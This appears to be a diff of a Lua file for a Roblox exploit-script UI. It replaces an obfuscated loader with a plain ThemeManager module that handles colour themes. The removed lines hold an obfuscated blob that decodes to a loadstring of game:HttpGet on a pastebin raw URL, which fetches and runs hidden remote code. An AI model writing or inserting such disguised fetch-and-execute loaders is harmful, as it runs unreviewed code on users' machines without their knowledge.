@@ -1,12 +1,250 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.4) ~  Much Love, Ferib 
+local httpService = game:GetService('HttpService')
+local ThemeManager = {} do
+	ThemeManager.Folder = 'LinoriaLibSettings'
+	-- if not isfolder(ThemeManager.Folder) then makefolder(ThemeManager.Folder) end
 
-]]--
+	ThemeManager.Library = nil
+	ThemeManager.BuiltInThemes = {
+		['Default'] 		= { 1, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1c1c1c","AccentColor":"0,219,255","BackgroundColor":"141414","OutlineColor":"323232"}') },
+		['BBot'] 			= { 2, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1e1e","AccentColor":"7e48a3","BackgroundColor":"232323","OutlineColor":"141414"}') },
+		['Fatality']		= { 3, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1842","AccentColor":"c50754","BackgroundColor":"191335","OutlineColor":"3c355d"}') },
+		['Jester'] 			= { 4, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"242424","AccentColor":"db4467","BackgroundColor":"1c1c1c","OutlineColor":"373737"}') },
+		['Mint'] 			= { 5, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"242424","AccentColor":"3db488","BackgroundColor":"1c1c1c","OutlineColor":"373737"}') },
+		['Tokyo Night'] 	= { 6, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"191925","AccentColor":"6759b3","BackgroundColor":"16161f","OutlineColor":"323232"}') },
+		['Ubuntu'] 			= { 7, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"3e3e3e","AccentColor":"e2581e","BackgroundColor":"323232","OutlineColor":"191919"}') },
+		['Quartz'] 			= { 8, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"232330","AccentColor":"426e87","BackgroundColor":"1d1b26","OutlineColor":"27232f"}') },
+	}
 
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19 then local v88=v5(v83,v19);v19=nil;return v88;else return v83;end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/((5 -3)^(v32-(2 -1))))%(((880 -(282 + 595)) -1)^(((v33-((1639 -(1523 + 114)) -(1 + 0))) -(v32-1)) + (620 -(555 + 64)))) ;return v84-(v84%(932 -(857 + 74))) ;else local v85=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v85 + v85))>=v85) and 1) or (0 + 0) ;end end local function v21() local v34=0 + 0 ;local v35;while true do if (v34==(1 -0)) then return v35;end if (v34==(1065 -(68 + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -((343 -(32 + 85)) + 1044)) ;v34=4 -3 ;end end end local function v22() local v36=0 + 0 ;local v37;local v38;while true do if (v36==(1 + 0 + 0)) then return (v38 * (1213 -(892 + 65))) + v37 ;end if (v36==(180 -(67 + 113))) then v37,v38=v1(v16,v18,v18 + (4 -2) );v18=v18 + 2 ;v36=1 -0 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + 3 );v18=v18 + (15 -11) ;return (v42 * (16778168 -(802 + 150))) + (v41 * 65536) + (v40 * (689 -433)) + v39 ;end local function v24() local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(1489 -(998 + 488))) then if (v48==(0 + 0)) then if (v47==(0 + 0)) then return v49 * (997 -(915 + 82)) ;else local v102=0 -(0 -0) ;while true do if (v102==(0 + 0)) then v48=1 + 0 + 0 ;v46=(0 + 0) -(1055 -(87 + 968)) ;break;end end end elseif (v48==((31997 -24728) -(4738 + 484))) then return ((v47==(0 -0)) and (v49 * ((1 -0)/(0 -(1413 -(447 + 966)))))) or (v49 * NaN) ;end return v8(v49,v48-((6050 -3840) -(1069 + 118)) ) * (v46 + (v47/((1 + 1)^(19 + 33)))) ;end if (v43==(4 -2)) then v48=v20(v45,45 -24 ,6 + (1842 -(1703 + 114)) );v49=((v20(v45,1112 -(1020 + (761 -(376 + 325))) )==(1 -(0 -0))) and  -(1 + (0 -0))) or (792 -(368 + 423)) ;v43=14 -11 ;end if (v43==(3 -2)) then v46=19 -(10 + 8) ;v47=(v20(v45,1748 -(760 + 987) ,76 -56 ) * ((444 -(416 + 26))^(102 -70))) + v44 ;v43=1 + 1 ;end if (v43==(0 -0)) then v44=v23();v45=v23();v43=439 -(145 + 293) ;end end end local function v25(v50) local v51=0 + 0 ;local v52;local v53;while true do if (v51==(1932 -(1869 + 61))) then v53={};for v89=2 -1 , #v52 do v53[v89]=v2(v1(v3(v52,v89,v89)));end v51=10 -7 ;end if ((17 -(9 + 5))==v51) then return v6(v53);end if (v51==(377 -((1056 -(140 + 831)) + 291))) then v52=v3(v16,v18,(v18 + v50) -(1266 -(243 + 1022)) );v18=v18 + v50 ;v51=2 -(1850 -(1409 + 441)) ;end if (v51==(0 -0)) then v52=nil;if  not v50 then local v95=0 + 0 ;while true do if (v95==(718 -(15 + 703))) then v50=v23();if (v50==((547 + 633) -((1561 -(262 + 176)) + (1778 -(345 + 1376))))) then return "";end break;end end end v51=1 + 0 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v54=0;local v55;local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (1~=v54) then else v57=nil;v58=nil;v54=2;end if (v54~=3) then else v61=nil;v62=nil;v54=11 -7 ;end if (v54~=0) then else v55=0 + 0 ;v56=nil;v54=1;end if (v54==2) then v59=nil;v60=nil;v54=3 + 0 ;end if (4==v54) then while true do if (2==v55) then local v98=0 + 0 ;local v99;while true do if (v98~=0) then else v99=0 + 0 ;while true do if (v99~=(127 -(116 + 10))) then else v55=3;break;end if (v99~=(0 + 0)) then else v60=nil;v61=nil;v99=739 -(542 + 196) ;end end break;end end end if (v55~=(0 -0)) then else local v100=0;while true do if (v100==(1 + 0)) then v55=1 + 0 ;break;end if (v100==0) then v56=0;v57=nil;v100=1 + 0 ;end end end if (3~=v55) then else v62=nil;while true do local v103=0 -0 ;while true do if (v103~=(2 -1)) then else if (v56==(1553 -(1126 + 425))) then local v135=0;local v136;while true do if ((405 -(118 + 287))==v135) then v136=0;while true do local v148=0 -0 ;while true do if (v148==0) then if (v136==(1122 -(118 + 1003))) then return v60;end if (v136~=(0 -0)) then else local v151=0;while true do if (v151==1) then v136=378 -(142 + 235) ;break;end if (0~=v151) then else for v158=1,v23() do local v159=0;local v160;while true do if (v159~=0) then else v160=v21();if (v20(v160,1,1)~=0) then else local v169=0 -0 ;local v170;local v171;local v172;local v173;local v174;local v175;while true do if (v169==2) then v174=nil;v175=nil;v169=1 + 2 ;end if (v169==(980 -(553 + 424))) then while true do if ((1 -0)~=v170) then else v173=nil;v174=nil;v170=2 + 0 ;end if (v170~=0) then else local v181=0 + 0 ;while true do if (v181~=0) then else v171=0 + 0 ;v172=nil;v181=1 + 0 ;end if (v181~=1) then else v170=1 + 0 ;break;end end end if (v170==(4 -2)) then v175=nil;while true do if ((5 -3)==v171) then while true do if (v172==1) then local v186=0 -0 ;local v187;while true do if (v186~=(0 + 0)) then else v187=0 -0 ;while true do if (v187~=(753 -(239 + 514))) then else local v196=0 + 0 ;local v197;while true do if (v196~=0) then else v197=0;while true do if (v197==0) then local v201=0;while true do if (v201~=(1330 -(797 + 532))) then else v197=1 + 0 ;break;end if (v201==(0 + 0)) then v175={v22(),v22(),nil,nil};if (v173==(1202 -(373 + 829))) then local v203=0;while true do if (v203~=(731 -(476 + 255))) then else v175[1133 -(369 + 761) ]=v22();v175[3 + 1 ]=v22();break;end end elseif (v173==1) then v175[5 -2 ]=v23();elseif (v173==2) then v175[3]=v23() -((3 -1)^16) ;elseif (v173==3) then local v212=0;local v213;while true do if ((238 -(64 + 174))~=v212) then else v213=0;while true do if (0==v213) then v175[1 + 2 ]=v23() -(2^16) ;v175[5 -1 ]=v22();break;end end break;end end end v201=1;end end end if (v197==(337 -(144 + 192))) then v187=1;break;end end break;end end end if (v187==(217 -(42 + 174))) then v172=2;break;end end break;end end end if (v172~=(2 + 0)) then else local v188=0 + 0 ;local v189;while true do if (v188~=0) then else v189=0;while true do if (v189==0) then local v198=0 + 0 ;local v199;while true do if (v198~=0) then else v199=0;while true do if (v199~=(1505 -(363 + 1141))) then else v189=1581 -(1183 + 397) ;break;end if (v199~=0) then else local v202=0 -0 ;while true do if (v202~=(1 + 0)) then else v199=1;break;end if (v202~=(0 + 0)) then else if (v20(v174,1,1976 -(1913 + 62) )~=(1 + 0)) then else v175[2]=v62[v175[5 -3 ]];end if (v20(v174,2,2)==(1934 -(565 + 1368))) then v175[3]=v62[v175[11 -8 ]];end v202=1;end end end end break;end end end if (v189~=(1662 -(1477 + 184))) then else v172=3 -0 ;break;end end break;end end end if (v172==(3 + 0)) then if (v20(v174,3,3)~=(857 -(564 + 292))) then else v175[6 -2 ]=v62[v175[4]];end v57[v158]=v175;break;end if (v172~=0) then else local v191=0 -0 ;local v192;while true do if (v191~=(304 -(244 + 60))) then else v192=0;while true do if (v192==(0 + 0)) then local v200=476 -(41 + 435) ;while true do if (v200==(1002 -(938 + 63))) then v192=1;break;end if (v200~=0) then else v173=v20(v160,2 + 0 ,1128 -(936 + 189) );v174=v20(v160,4,2 + 4 );v200=1614 -(1565 + 48) ;end end end if (1==v192) then v172=1 + 0 ;break;end end break;end end end end break;end if (v171==(1138 -(782 + 356))) then local v182=0;local v183;while true do if (v182==0) then v183=0;while true do if (v183~=1) then else v171=268 -(176 + 91) ;break;end if (v183~=(0 -0)) then else local v195=0;while true do if (v195==0) then v172=0;v173=nil;v195=1;end if (v195~=1) then else v183=1;break;end end end end break;end end end if ((1 -0)~=v171) then else local v184=1092 -(975 + 117) ;while true do if (v184~=0) then else v174=nil;v175=nil;v184=1876 -(157 + 1718) ;end if (v184==(1 + 0)) then v171=6 -4 ;break;end end end end break;end end break;end if (v169==1) then v172=nil;v173=nil;v169=2;end if (v169~=(0 -0)) then else v170=0;v171=nil;v169=1019 -(697 + 321) ;end end end break;end end end for v161=2 -1 ,v23() do v58[v161-(1 -0) ]=v28();end v151=2 -1 ;end end end break;end end end break;end end end break;end if (v103==0) then local v104=0 + 0 ;while true do if (v104~=(0 -0)) then else if (v56==1) then local v140=0 -0 ;local v141;while true do if (v140~=(1227 -(322 + 905))) then else v141=611 -(602 + 9) ;while true do if (0~=v141) then else local v152=1189 -(449 + 740) ;while true do if (v152~=(872 -(826 + 46))) then else local v156=947 -(245 + 702) ;while true do if (v156==(3 -2)) then v152=1;break;end if ((0 + 0)~=v156) then else v61=v23();v62={};v156=1;end end end if (v152~=1) then else v141=1899 -(260 + 1638) ;break;end end end if (v141~=(441 -(382 + 58))) then else local v153=0 -0 ;while true do if (v153==0) then for v163=1,v61 do local v164=0 + 0 ;local v165;local v166;local v167;local v168;while true do if (v164==0) then v165=0 -0 ;v166=nil;v164=2 -1 ;end if (v164~=1) then else v167=nil;v168=nil;v164=1207 -(902 + 303) ;end if (v164~=(3 -1)) then else while true do if (v165~=0) then else local v176=0 -0 ;while true do if (v176~=(1 + 0)) then else v165=1;break;end if (v176==0) then local v177=0;while true do if (v177==(1690 -(1121 + 569))) then v166=214 -(22 + 192) ;v167=nil;v177=1;end if (1==v177) then v176=1;break;end end end end end if (v165~=(684 -(483 + 200))) then else v168=nil;while true do if (v166~=0) then else local v178=0;local v179;while true do if (v178~=0) then else v179=1463 -(1404 + 59) ;while true do if (1~=v179) then else v166=2 -1 ;break;end if (v179==(0 -0)) then local v185=0;while true do if (0==v185) then v167=v21();v168=nil;v185=766 -(468 + 297) ;end if (v185==(563 -(334 + 228))) then v179=1;break;end end end end break;end end end if (v166==(3 -2)) then if (v167==(2 -1)) then v168=v21()~=(0 -0) ;elseif (v167==2) then v168=v24();elseif (v167~=(1 + 2)) then else v168=v25();end v62[v163]=v168;break;end end break;end end break;end end end v60[3]=v21();v153=237 -(141 + 95) ;end if (1~=v153) then else v141=2 + 0 ;break;end end end if (v141~=2) then else v56=4 -2 ;break;end end break;end end end if ((0 -0)==v56) then local v142=0 + 0 ;local v143;while true do if (v142==0) then v143=0;while true do if (v143~=(2 -1)) then else local v154=0;while true do if (v154~=0) then else v59={};v60={v57,v58,nil,v59};v154=1;end if (v154==(1 + 0)) then v143=2 -0 ;break;end end end if ((2 + 0)~=v143) then else v56=164 -(92 + 71) ;break;end if (v143~=0) then else local v155=0 + 0 ;while true do if (v155==0) then v57={};v58={};v155=1 -0 ;end if (v155==1) then v143=1;break;end end end end break;end end end v104=766 -(574 + 191) ;end if (v104~=(1 + 0)) then else v103=1;break;end end end end end break;end if (v55==1) then local v101=0;while true do if (v101==1) then v55=4 -2 ;break;end if ((0 + 0)~=v101) then else v58=nil;v59=nil;v101=850 -(254 + 595) ;end end end end break;end end end local function v29(v63,v64,v65) local v66=v63[1];local v67=v63[2];local v68=v63[3];return function(...) local v69=v66;local v70=v67;local v71=v68;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v86=0,v77 do if (v86>=v71) then v75[v86-v71 ]=v76[v86 + 1 ];else v79[v86]=v76[v86 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v87=0;while true do if (v87==1) then if (v82<=3) then if (v82<=1) then if (v82>0) then v79[v81[2]]=v65[v81[3]];else local v107;local v108,v109;local v110;local v111;v79[v81[2]]=v65[v81[3]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v65[v81[3]];v73=v73 + 1 ;v81=v69[v73];v111=v81[2];v110=v79[v81[3]];v79[v111 + 1 ]=v110;v79[v111]=v110[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v111=v81[2];v108,v109=v72(v79[v111](v13(v79,v111 + 1 ,v81[3])));v74=(v109 + v111) -1 ;v107=0;for v137=v111,v74 do local v138=0;while true do if (0==v138) then v107=v107 + 1 ;v79[v137]=v108[v107];break;end end end v73=v73 + 1 ;v81=v69[v73];v111=v81[2];v79[v111]=v79[v111](v13(v79,v111 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v81=v69[v73];do return;end end elseif (v82>2) then do return;end else v79[v81[2]]();end elseif (v82<=5) then if (v82==4) then local v121=v81[2];v79[v121]=v79[v121](v13(v79,v121 + 1 ,v74));else local v123=v81[2];local v124=v79[v81[3]];v79[v123 + 1 ]=v124;v79[v123]=v124[v81[4]];end elseif (v82==6) then v79[v81[2]]=v81[3];else local v130=0;local v131;local v132;local v133;local v134;while true do if (v130==1) then v74=(v133 + v131) -1 ;v134=0;v130=2;end if (0==v130) then v131=v81[2];v132,v133=v72(v79[v131](v13(v79,v131 + 1 ,v81[3])));v130=1;end if (v130==2) then for v146=v131,v74 do local v147=0;while true do if (v147==0) then v134=v134 + 1 ;v79[v146]=v132[v134];break;end end end break;end end end v73=v73 + 1 ;break;end if (v87==0) then v81=v69[v73];v82=v81[1];v87=1;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F6837516E626D6A5600083O00124O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);
+	function ThemeManager:ApplyTheme(theme)
+		local customThemeData = self:GetCustomTheme(theme)
+		local data = customThemeData or self.BuiltInThemes[theme]
+
+		if not data then return end
+
+		-- custom themes are just regular dictionaries instead of an array with { index, dictionary }
+
+		local scheme = data[2]
+		for idx, col in next, customThemeData or scheme do
+			self.Library[idx] = Color3.fromHex(col)
+			
+			if Options[idx] then
+				Options[idx]:SetValueRGB(Color3.fromHex(col))
+			end
+		end
+
+		self:ThemeUpdate()
+	end
+
+	function ThemeManager:ThemeUpdate()
+		-- This allows us to force apply themes without loading the themes tab :)
+		local options = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }
+		for i, field in next, options do
+			if Options and Options[field] then
+				self.Library[field] = Options[field].Value
+			end
+		end
+
+		self.Library.AccentColorDark = self.Library:GetDarkerColor(self.Library.AccentColor);
+		self.Library:UpdateColorsUsingRegistry()
+	end
+
+	function ThemeManager:LoadDefault()		
+		local theme = 'Default'
+		local content = isfile(self.Folder .. '/themes/default.txt') and readfile(self.Folder .. '/themes/default.txt')
+
+		local isDefault = true
+		if content then
+			if self.BuiltInThemes[content] then
+				theme = content
+			elseif self:GetCustomTheme(content) then
+				theme = content
+				isDefault = false;
+			end
+		elseif self.BuiltInThemes[self.DefaultTheme] then
+		 	theme = self.DefaultTheme
+		end
+
+		if isDefault then
+			Options.ThemeManager_ThemeList:SetValue(theme)
+		else
+			self:ApplyTheme(theme)
+		end
+	end
+
+	function ThemeManager:SaveDefault(theme)
+		writefile(self.Folder .. '/themes/default.txt', theme)
+	end
+
+	function ThemeManager:CreateThemeManager(groupbox)
+		groupbox:AddLabel('Background color'):AddColorPicker('BackgroundColor', { Default = self.Library.BackgroundColor });
+		groupbox:AddLabel('Main color')	:AddColorPicker('MainColor', { Default = self.Library.MainColor });
+		groupbox:AddLabel('Accent color'):AddColorPicker('AccentColor', { Default = self.Library.AccentColor });
+		groupbox:AddLabel('Outline color'):AddColorPicker('OutlineColor', { Default = self.Library.OutlineColor });
+		groupbox:AddLabel('Font color')	:AddColorPicker('FontColor', { Default = self.Library.FontColor });
+
+		local ThemesArray = {}
+		for Name, Theme in next, self.BuiltInThemes do
+			table.insert(ThemesArray, Name)
+		end
+
+		table.sort(ThemesArray, function(a, b) return self.BuiltInThemes[a][1] < self.BuiltInThemes[b][1] end)
+
+		groupbox:AddDivider()
+		groupbox:AddDropdown('ThemeManager_ThemeList', { Text = 'Theme list', Values = ThemesArray, Default = 1 })
+
+		groupbox:AddButton('Set as default', function()
+			self:SaveDefault(Options.ThemeManager_ThemeList.Value)
+			self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_ThemeList.Value))
+		end)
+
+		Options.ThemeManager_ThemeList:OnChanged(function()
+			self:ApplyTheme(Options.ThemeManager_ThemeList.Value)
+		end)
+
+		groupbox:AddDivider()
+		groupbox:AddInput('ThemeManager_CustomThemeName', { Text = 'Custom theme name' })
+		groupbox:AddDropdown('ThemeManager_CustomThemeList', { Text = 'Custom themes', Values = self:ReloadCustomThemes(), AllowNull = true, Default = 1 })
+		groupbox:AddDivider()
+		
+		groupbox:AddButton('Save theme', function() 
+			self:SaveCustomTheme(Options.ThemeManager_CustomThemeName.Value)
+
+			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
+			Options.ThemeManager_CustomThemeList:SetValue(nil)
+		end):AddButton('Load theme', function() 
+			self:ApplyTheme(Options.ThemeManager_CustomThemeList.Value) 
+		end)
+
+		groupbox:AddButton('Refresh list', function()
+			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
+			Options.ThemeManager_CustomThemeList:SetValue(nil)
+		end)
+
+		groupbox:AddButton('Set as default', function()
+			if Options.ThemeManager_CustomThemeList.Value ~= nil and Options.ThemeManager_CustomThemeList.Value ~= '' then
+				self:SaveDefault(Options.ThemeManager_CustomThemeList.Value)
+				self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_CustomThemeList.Value))
+			end
+		end)
+
+		ThemeManager:LoadDefault()
+
+		local function UpdateTheme()
+			self:ThemeUpdate()
+		end
+
+		Options.BackgroundColor:OnChanged(UpdateTheme)
+		Options.MainColor:OnChanged(UpdateTheme)
+		Options.AccentColor:OnChanged(UpdateTheme)
+		Options.OutlineColor:OnChanged(UpdateTheme)
+		Options.FontColor:OnChanged(UpdateTheme)
+	end
+
+	function ThemeManager:GetCustomTheme(file)
+		local path = self.Folder .. '/themes/' .. file
+		if not isfile(path) then
+			return nil
+		end
+
+		local data = readfile(path)
+		local success, decoded = pcall(httpService.JSONDecode, httpService, data)
+		
+		if not success then
+			return nil
+		end
+
+		return decoded
+	end
+
+	function ThemeManager:SaveCustomTheme(file)
+		if file:gsub(' ', '') == '' then
+			return self.Library:Notify('Invalid file name for theme (empty)', 3)
+		end
+
+		local theme = {}
+		local fields = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }
+
+		for _, field in next, fields do
+			theme[field] = Options[field].Value:ToHex()
+		end
+
+		writefile(self.Folder .. '/themes/' .. file .. '.json', httpService:JSONEncode(theme))
+	end
+
+	function ThemeManager:ReloadCustomThemes()
+		local list = listfiles(self.Folder .. '/themes')
+
+		local out = {}
+		for i = 1, #list do
+			local file = list[i]
+			if file:sub(-5) == '.json' then
+				-- i hate this but it has to be done ...
+
+				local pos = file:find('.json', 1, true)
+				local char = file:sub(pos, pos)
+
+				while char ~= '/' and char ~= '\\' and char ~= '' do
+					pos = pos - 1
+					char = file:sub(pos, pos)
+				end
+
+				if char == '/' or char == '\\' then
+					table.insert(out, file:sub(pos + 1))
+				end
+			end
+		end
+
+		return out
+	end
+
+	function ThemeManager:SetLibrary(lib)
+		self.Library = lib
+	end
+
+	function ThemeManager:BuildFolderTree()
+		local paths = {}
+
+		-- build the entire tree if a path is like some-hub/phantom-forces
+		-- makefolder builds the entire tree on Synapse X but not other exploits
+
+		local parts = self.Folder:split('/')
+		for idx = 1, #parts do
+			paths[#paths + 1] = table.concat(parts, '/', 1, idx)
+		end
+
+		table.insert(paths, self.Folder .. '/themes')
+		table.insert(paths, self.Folder .. '/settings')
+
+		for i = 1, #paths do
+			local str = paths[i]
+			if not isfolder(str) then
+				makefolder(str)
+			end
+		end
+	end
+
+	function ThemeManager:SetFolder(folder)
+		self.Folder = folder
+		self:BuildFolderTree()
+	end
+
+	function ThemeManager:CreateGroupBox(tab)
+		assert(self.Library, 'Must set ThemeManager.Library first!')
+		return tab:AddLeftGroupbox('Themes')
+	end
+
+	function ThemeManager:ApplyToTab(tab)
+		assert(self.Library, 'Must set ThemeManager.Library first!')
+		local groupbox = self:CreateGroupBox(tab)
+		self:CreateThemeManager(groupbox)
+	end
+
+	function ThemeManager:ApplyToGroupbox(groupbox)
+		assert(self.Library, 'Must set ThemeManager.Library first!')
+		self:CreateThemeManager(groupbox)
+	end
+
+	ThemeManager:BuildFolderTree()
+end
+
+return ThemeManager
